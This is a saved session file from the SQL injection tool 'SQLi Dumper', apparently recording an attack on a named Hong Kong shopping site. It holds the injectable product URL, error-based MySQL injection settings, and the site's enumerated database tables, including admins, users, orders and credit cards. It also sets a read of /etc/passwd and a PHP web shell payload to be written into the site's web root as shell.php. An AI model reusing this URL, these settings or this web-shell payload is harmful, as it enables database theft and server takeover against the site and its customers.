﻿<?xml version="1.0" encoding="UTF-8"?>
<SQLi_Dumper>
  <Section Name="Dumper">
    <Key Name="txtCookies" Value="" />
    <Key Name="chkThreads" Value="False" />
    <Key Name="cmbMethod" Value="GET" />
    <Key Name="txtAddHeaderValue" Value="" />
    <Key Name="numThreads" Value="10" />
    <Key Name="txtAddHeaderName" Value="" />
    <Key Name="cmbMySQLErrType" Value="XPATH - UpdateXML" />
    <Key Name="numSleepMultiThread" Value="50" />
    <Key Name="chkDumpIFNULL" Value="True" />
    <Key Name="txtCustomQueryFrom" Value="" />
    <Key Name="chkReDumpFailed" Value="True" />
    <Key Name="chkOracleCastAsChar" Value="True" />
    <Key Name="chkDumpFieldByField" Value="True" />
    <Key Name="numTimeOut" Value="10" />
    <Key Name="cmbOracleErrType" Value="GET_HOST_ADDRESS" />
    <Key Name="trwSchema" Value="playsand_db               [114]\va_admin_privileges       [? #    ?]|playsand_db               [114]\va_admin_privileges_settings?'[? #    ?]|playsand_db               [114]\va_admins                 [? #    ?]|playsand_db               [114]\va_ads_assigned           [? #    ?]|playsand_db               [114]\va_ads_categories         [? #    ?]|playsand_db               [114]\va_ads_features           [? #    ?]|playsand_db               [114]\va_ads_features_default   [? #    ?]|playsand_db               [114]\va_ads_features_groups    [? #    ?]|playsand_db               [114]\va_ads_images             [? #    ?]|playsand_db               [114]\va_ads_items              [? #    ?]|playsand_db               [114]\va_ads_properties         [? #    ?]|playsand_db               [114]\va_ads_properties_default [? #    ?]|playsand_db               [114]\va_ads_types              [? #    ?]|playsand_db               [114]\va_articles               [? #    ?]|playsand_db               [114]\va_articles_assigned      [? #    ?]|playsand_db               [114]\va_articles_categories    [? #    ?]|playsand_db               [114]\va_articles_images        [? #    ?]|playsand_db               [114]\va_articles_related       [? #    ?]|playsand_db               [114]\va_articles_reviews       [? #    ?]|playsand_db               [114]\va_articles_statuses      [? #    ?]|playsand_db               [114]\va_banned_contents        [? #    ?]|playsand_db               [114]\va_banners                [? #    ?]|playsand_db               [114]\va_banners_assigned       [? #    ?]|playsand_db               [114]\va_banners_clicks         [? #    ?]|playsand_db               [114]\va_banners_groups         [? #    ?]|playsand_db               [114]\va_black_ips              [? #    ?]|playsand_db               [114]\va_categories             [? #    ?]|playsand_db               [114]\va_cc_expiry_years        [? #    ?]|playsand_db               [114]\va_cc_start_years         [? #    ?]|playsand_db               [114]\va_change_types           [? #    ?]|playsand_db               [114]\va_companies              [? #    ?]|playsand_db               [114]\va_countries              [? #    ?]|playsand_db               [114]\va_coupons                [? #    ?]|playsand_db               [114]\va_credit_cards           [? #    ?]|playsand_db               [114]\va_currencies             [? #    ?]|playsand_db               [114]\va_custom_blocks          [? #    ?]|playsand_db               [114]\va_events                 [? #    ?]|playsand_db               [114]\va_faq                    [? #    ?]|playsand_db               [114]\va_features               [? #    ?]|playsand_db               [114]\va_features_default       [? #    ?]|playsand_db               [114]\va_features_groups        [? #    ?]|playsand_db               [114]\va_forum                  [? #    ?]|playsand_db               [114]\va_forum_categories       [? #    ?]|playsand_db               [114]\va_forum_list             [? #    ?]|playsand_db               [114]\va_forum_messages         [? #    ?]|playsand_db               [114]\va_forum_moderators       [? #    ?]|playsand_db               [114]\va_global_settings        [? #    ?]|playsand_db               [114]\va_header_links           [? #    ?]|playsand_db               [114]\va_issue_numbers          [? #    ?]|playsand_db               [114]\va_item_types             [? #    ?]|playsand_db               [114]\va_items                  [? #    ?]|playsand_db               [114]\va_items_accessories      [? #    ?]|playsand_db               [114]\va_items_categories       [? #    ?]|playsand_db               [114]\va_items_downloads        [? #    ?]|playsand_db               [114]\va_items_downloads_statistic?'[? #    ?]|playsand_db               [114]\va_items_images           [? #    ?]|playsand_db               [114]\va_items_prices           [? #    ?]|playsand_db               [114]\va_items_properties       [? #    ?]|playsand_db               [114]\va_items_properties_values[? #    ?]|playsand_db               [114]\va_items_related          [? #    ?]|playsand_db               [114]\va_items_serials          [? #    ?]|playsand_db               [114]\va_languages              [? #    ?]|playsand_db               [114]\va_layouts                [? #    ?]|playsand_db               [114]\va_manufacturers          [? #    ?]|playsand_db               [114]\va_news                   [? #    ?]|playsand_db               [114]\va_newsletters            [? #    ?]|playsand_db               [114]\va_newsletters_emails     [? #    ?]|playsand_db               [114]\va_newsletters_users      [? #    ?]|playsand_db               [114]\va_order_custom_properties[? #    ?]|playsand_db               [114]\va_order_custom_values    [? #    ?]|playsand_db               [114]\va_order_statuses         [? #    ?]|playsand_db               [114]\va_orders                 [? #    ?]|playsand_db               [114]\va_orders_events          [? #    ?]|playsand_db               [114]\va_orders_items           [? #    ?]|playsand_db               [114]\va_orders_items_properties[? #    ?]|playsand_db               [114]\va_orders_items_serials   [? #    ?]|playsand_db               [114]\va_orders_notes           [? #    ?]|playsand_db               [114]\va_orders_properties      [? #    ?]|playsand_db               [114]\va_orders_serials_activations'[? #    ?]|playsand_db               [114]\va_page_settings          [? #    ?]|playsand_db               [114]\va_pages                  [? #    ?]|playsand_db               [114]\va_payment_parameters     [? #    ?]|playsand_db               [114]\va_payment_systems        [? #    ?]|playsand_db               [114]\va_polls                  [? #    ?]|playsand_db               [114]\va_polls_options          [? #    ?]|playsand_db               [114]\va_polls_votes            [? #    ?]|playsand_db               [114]\va_release_changes        [? #    ?]|playsand_db               [114]\va_release_types          [? #    ?]|playsand_db               [114]\va_releases               [? #    ?]|playsand_db               [114]\va_reviews                [? #    ?]|playsand_db               [114]\va_shipping_modules       [? #    ?]|playsand_db               [114]\va_shipping_modules_parameter'[? #    ?]|playsand_db               [114]\va_shipping_rules         [? #    ?]|playsand_db               [114]\va_shipping_times         [? #    ?]|playsand_db               [114]\va_shipping_types         [? #    ?]|playsand_db               [114]\va_shipping_types_countries?~'[? #    ?]|playsand_db               [114]\va_states                 [? #    ?]|playsand_db               [114]\va_support                [? #    ?]|playsand_db               [114]\va_support_attachments    [? #    ?]|playsand_db               [114]\va_support_departments    [? #    ?]|playsand_db               [114]\va_support_messages       [? #    ?]|playsand_db               [114]\va_support_predefined     [? #    ?]|playsand_db               [114]\va_support_priorities     [? #    ?]|playsand_db               [114]\va_support_products       [? #    ?]|playsand_db               [114]\va_support_statuses       [? #    ?]|playsand_db               [114]\va_support_time_report    [? #    ?]|playsand_db               [114]\va_support_types          [? #    ?]|playsand_db               [114]\va_support_users_departments?'[? #    ?]|playsand_db               [114]\va_support_users_priorities?~'[? #    ?]|playsand_db               [114]\va_tax_rates              [? #    ?]|playsand_db               [114]\va_tax_rates_items        [? #    ?]|playsand_db               [114]\va_user_types             [? #    ?]|playsand_db               [114]\va_user_types_settings    [? #    ?]|playsand_db               [114]\va_users                  [? #    ?]" />
    <Key Name="chkMSSQL_Latin1" Value="False" />
    <Key Name="chkHttpRedirect" Value="True" />
    <Key Name="numLimitMax" Value="0" />
    <Key Name="txtPost" Value="" />
    <Key Name="chkDumpEncodedHex" Value="False" />
    <Key Name="numSleep" Value="500" />
    <Key Name="chkDumpWhere" Value="False" />
    <Key Name="numFieldByField" Value="1" />
    <Key Name="cmbSqlType" Value="MySQL Error" />
    <Key Name="numLimitX" Value="0" />
    <Key Name="cmbMSSQLCast" Value="nvarchar" />
    <Key Name="chkAddHearder" Value="False" />
    <Key Name="numMaxRetryMultiThread" Value="100" />
    <Key Name="txtPassword" Value="" />
    <Key Name="txtCustomQuery" Value="" />
    <Key Name="cmbMySQLCollations" Value="Unhex(Hex())" />
    <Key Name="chkClearListOnGet" Value="False" />
    <Key Name="chkAllInOneRequest" Value="True" />
    <Key Name="numMaxRetryColumn" Value="5" />
    <Key Name="cmbInjectionPoint" Value="URL" />
    <Key Name="cmbOracleTopN" Value="ROWNUM" />
    <Key Name="tscSchemas" Value="" />
    <Key Name="chkMSSQLCastAsChar" Value="True" />
    <Key Name="txtUserName" Value="" />
    <Key Name="chkDumpOrderBy" Value="False" />
    <Key Name="txtSchemaWhere" Value="1=1 or not 1=0" />
    <Key Name="numMaxRetry" Value="5" />
    <Key Name="txtSchemaOrderBy" Value="1 asc, 2 desc" />
    <Key Name="" Value="http://www.playsand.com.hk/main/product.php?cat=[t]" />
    <Key Name="lblVersion" Value="5.5.33" />
    <Key Name="lblCountry" Value="[HK] Hong Kong" />
    <Key Name="lblCountBDs" Value="-1" />
    <Key Name="txtMySQLReadFilePath" Value="/etc/passwd" />
    <Key Name="txtMySQLWriteFile" Value="'&lt;? system($_REQUEST['cmd']); ?&gt;'" />
    <Key Name="txtMySQLWriteFilePath" Value="'/home/www/HostName_com/html/shell.php'" />
    <Key Name="cmbMySQLWriteFilePath" Value="INTO OUTFILE" />
    <Key Name="cmbMySQLReadFile" Value="HEX" />
    <Key Name="__CurrentDataBase" Value="playsand_db" />
    <Key Name="trwSchema.Selected" Value="playsand_db" />
  </Section>
</SQLi_Dumper>